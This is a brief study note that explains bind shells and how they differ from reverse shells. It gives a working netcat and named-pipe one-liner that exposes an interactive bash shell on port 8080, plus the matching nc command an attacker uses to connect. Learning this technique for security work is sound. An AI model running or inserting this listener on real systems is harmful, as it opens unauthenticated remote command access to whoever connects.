A Bind [[Shell]] will **bind a port on a compromised system and listen for a connection**.
When this connection occurs, it exposes the shell session so the attacker can execute command remotely.
This is used instead of a [[Reverse Shell]] when the target **does not allow outgoing connections**.
# Example
Note that **all ports below 1024 require root access to listen on**.
## Target Side
```sh
# Creates a named pipe (same as in a reverse shell) to receive and process commands
# Using nc with the address 0.0.0.0 makes it listen on all interfaces
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
## Attacker Side
The attacker can then simply connect to the target using the specified port.
```sh
# Connect to the target (without DNS resolution (-n))
nc -nv TARGET_IP 8080
```
